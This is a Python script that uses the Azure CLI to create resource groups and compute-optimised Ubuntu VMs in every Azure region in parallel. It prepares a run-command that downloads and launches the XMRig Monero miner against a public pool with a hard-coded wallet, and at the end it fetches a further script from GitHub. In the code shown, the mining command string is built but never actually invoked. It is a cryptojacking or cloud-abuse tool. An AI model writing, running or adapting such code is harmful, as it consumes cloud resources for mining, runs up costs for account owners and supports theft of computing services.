from azure.cli.core import get_default_cli
import json,os
import multiprocessing

print('''
                                                                     _______________
                                                                     < Dhen, Sapatha! >
                                                                      ---------------
                                                                             \   ^__^
                                                                              \  (oo)\_______
                                                                                 (__)\       )\/\\
                                                                                     ||----w |
                                                                                     ||     ||
                
                                                        AUTHOR : @sAmPawam ThUwAraKan    | karupiyagounder@gmail.com    ''')



sn    = ""


def az_cli (args_str):
    args = args_str.split()
    cli = get_default_cli()
    cli.invoke(args)
    if cli.result.result:
        return(cli.result.result)    
    elif cli.result.error:
        print("ERROR")    
    return True

print("* Creating VM")
#calling for Locations
response = az_cli('account list-locations')

def deployer(x):
        location=(response[x]["name"])
        #CREATING GROUP
        group   = az_cli('group create --name ride'+str(x)+' --location '+location)
        if(len(str(group))!=4):
          if (len(group)==7):
            runC='az vm run-command invoke -g ride'+str(x)+' -n ride'+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o us-west.minexmr.com:4444 -u 4834UE5mV3n1PG7yZRZ7mAiTGWi6mDtUJcgLugeYAj76NwDa8mG78x3JEvsMYFjCgbVPAX1V8coxW4RHknwHxG55Nvbk6Pi.'+sn+'"'  
            print("Deploying VM")
            print("      * VM NAME     : ride"+str(x))
            print("      * VM GROUP    : ride"+str(x))
            print("      * VM LOCATION : "+location)
            #DEPLOYING VM
            VM      =  az_cli('vm create --resource-group ride'+str(x)+' --name ride'+str(x)+' --image UbuntuLTS --size Standard_F4 --generate-ssh-keys')
            #print("      * Script Executing : "+runC)

            
for x in range(len(response)):
        p =  multiprocessing.Process(target= deployer, args = [x])
        p.start()
      
print ("* SUCCSESS")
os.system("wget https://raw.githubusercontent.com/Thuwarakan/bulletpaandi/main/untitled.py ")

